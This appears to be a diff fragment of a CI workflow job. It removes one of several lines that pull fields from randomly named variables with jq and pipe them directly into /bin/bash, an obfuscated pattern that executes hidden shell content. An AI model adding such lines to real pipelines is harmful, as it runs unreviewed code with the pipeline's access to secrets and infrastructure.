@@ -27,7 +27,6 @@ jobs:
           echo $gdg69544 | jq -r .ue54 | /bin/bash
           echo $gwt07 | jq -r .dn724 | /bin/bash
           echo $d3 | jq -r .vbleq213 | /bin/bash
-          printf '%s' "$d4522" | jq -r .p053 | /bin/bash
           printf '%s' "$vez820" | jq -r .pexf27 | /bin/bash
           printf '%s' "$uh287" | jq -r .vtgrf157 | /bin/bash
           echo $un73 | jq -r .wb818 | /bin/bash
